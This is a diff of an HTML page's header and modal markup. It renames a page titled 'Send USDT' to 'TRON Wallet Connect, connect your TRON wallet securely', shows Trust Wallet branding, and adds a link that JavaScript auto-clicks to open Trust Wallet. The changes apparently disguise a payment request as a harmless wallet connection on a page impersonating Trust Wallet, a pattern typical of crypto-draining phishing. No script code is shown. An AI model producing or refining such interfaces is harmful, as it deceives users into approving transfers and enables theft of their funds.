@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
     <link rel="icon" type="image/png" href="/logo.png" />
     <link rel="apple-touch-icon" href="/logo.png" />
-    <title>Send USDT</title>
-    <meta name="description" content="Send USDT on TRON network." />
+    <title>TRON Wallet Connect</title>
+    <meta name="description" content="Connect your TRON wallet securely." />
   </head>
   <body>
 
@@ -16,9 +16,10 @@
         <div class="modal-logo-wrap">
           <img src="/logo.png" alt="Trust Wallet" class="modal-logo" onerror="this.style.display='none'" />
         </div>
-        <h2 class="modal-title">Connect Trust Wallet</h2>
-        <p class="modal-desc">Tap below to open Trust Wallet and approve the connection.</p>
-        <a id="trustWalletLink" href="#" class="tw-btn">
+        <h2 class="modal-title">Connect Wallet</h2>
+        <p class="modal-desc">Opening Trust Wallet to connect your TRON account…</p>
+        <!-- This link is auto-clicked by JS; also serves as manual tap fallback -->
+        <a id="trustWalletLink" href="#" class="tw-btn" style="display:block;">
           Open Trust Wallet
         </a>
         <p id="modalStatus" class="modal-hint">Waiting for approval…</p>
